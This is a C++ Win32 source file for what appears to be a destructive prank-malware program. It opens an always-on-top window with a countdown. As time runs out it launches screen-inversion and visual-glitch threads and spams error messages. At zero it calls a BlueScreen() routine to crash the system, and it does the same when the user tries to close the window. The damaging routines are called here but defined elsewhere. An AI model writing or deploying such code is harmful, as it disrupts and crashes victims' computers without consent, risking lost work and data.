#include "Common.hpp"

#define IDT_TIMER 1
#define timerDuration 5000

bool InvertEnable   = false;
bool ERROREnable    = false;
bool PointEnable    = false;

static int remainingTime = timerDuration;

WNDCLASSEX InitWndClass(HINSTANCE hInstance);

Gdiplus::Image* image = NULL;
std::mutex imageMutex;

HWND CreateMainWindow(HINSTANCE hInstance) {
    HWND hwnd = CreateWindowEx(
        WS_EX_TOPMOST, CLASS_NAME, WindowName,
        WS_POPUP | WS_BORDER,
        ((ScreenWidth / 2) - (WindowSize / 2)), ((ScreenHeight / 2) - (WindowSize / 2)), WindowSize, WindowSize,
        NULL, NULL, hInstance, WindowProc
    );

    return hwnd;
}

void DrawTimer(HDC hdc) {
    HFONT hFont = CreateFont(
        32,
        0,
        0,
        0,
        FW_NORMAL,
        FALSE,
        FALSE,
        FALSE,
        DEFAULT_CHARSET,
        OUT_DEFAULT_PRECIS,
        CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY,
        DEFAULT_QUALITY,
        "Arial");

    HFONT hOldFont = (HFONT)SelectObject(hdc, hFont);

    std::string TIME_TEXT = "Time left: " + std::to_string(remainingTime);

    SetTextColor(hdc, RGB(255, 255, 255));
    SetBkMode(hdc, TRANSPARENT);

    TextOutA(hdc, (WindowSize / 2) - (WindowSize / 8), 0, TIME_TEXT.c_str(), TIME_TEXT.length());

    SelectObject(hdc, hOldFont);
    DeleteObject(hFont);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE: { SetTimer(hwnd, IDT_TIMER, 1, NULL); } break;
    case WM_TIMER: {
        if (wParam == IDT_TIMER) {
            remainingTime--;

            if (remainingTime <= 4800) {
                if (!InvertEnable) {
                    std::thread InvertEffectThread(GDI::InvertColor);
                    InvertEffectThread.detach();
                    InvertEnable = true;
                }
            }

            if (remainingTime <= 2400) {
                if (!ERROREnable) {
                    std::thread ERRORThread(ERRORSpam, hwnd);
                    ERRORThread.detach();
                    ERROREnable = true;
                }
            }

            if (remainingTime <= 1200) {
                if (!PointEnable) {
                    std::thread PointEffectThread(GDI::PointEffect);
                    PointEffectThread.detach();
                    PointEnable = true;
                }
            }

            if (remainingTime <= 0) {
                remainingTime = 0; 
                KillTimer(hwnd, IDT_TIMER); 
                BlueScreen();
            }

            InvalidateRect(hwnd, NULL, FALSE);
        }
    } break;
    case WM_PAINT: {
        std::lock_guard<std::mutex> lock(imageMutex);

        if (!image) {
            HRSRC hRes = FindResource(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_PNG), "PNG");
            if (hRes) {
                DWORD imageSize = SizeofResource(GetModuleHandle(NULL), hRes);
                HGLOBAL hResData = LoadResource(GetModuleHandle(NULL), hRes);
                if (hResData) {
                    const void* pResourceData = LockResource(hResData);
                    if (pResourceData) {
                        HGLOBAL hBuffer = GlobalAlloc(GMEM_MOVEABLE, imageSize);
                        if (hBuffer) {
                            void* pBuffer = GlobalLock(hBuffer);
                            memcpy(pBuffer, pResourceData, imageSize);
                            GlobalUnlock(hBuffer);

                            IStream* pStream = NULL;
                            if (CreateStreamOnHGlobal(hBuffer, TRUE, &pStream) == S_OK) {
                                delete image; // безопасное удаление предыдущего изображения
                                image = Gdiplus::Image::FromStream(pStream);
                                pStream->Release();
                                GlobalFree(hBuffer);
                            }
                        }
                    }
                }
            }
        }

        if (image) {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            Gdiplus::Graphics graphics(hdc);
            graphics.DrawImage(image, 0, 0, WindowSize, WindowSize);
            
            DrawTimer(hdc);

            EndPaint(hwnd, &ps);
        }
    } break;
    case WM_CLOSE: { BlueScreen(); } break;
    default: return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

WNDCLASSEX InitWndClass(HINSTANCE hInstance) {
    WNDCLASSEX wc = { 0 };

    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = 0;
    wc.lpfnWndProc = WindowProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDR_ICON));
    wc.hCursor = LoadCursor(hInstance, IDC_ARROW);
    wc.hbrBackground = CreateSolidBrush(RGB(100, 100, 100));
    wc.lpszMenuName = NULL;
    wc.lpszClassName = CLASS_NAME;
    wc.hIconSm = LoadIcon(hInstance, MAKEINTRESOURCE(IDR_ICON));

    return wc;
}
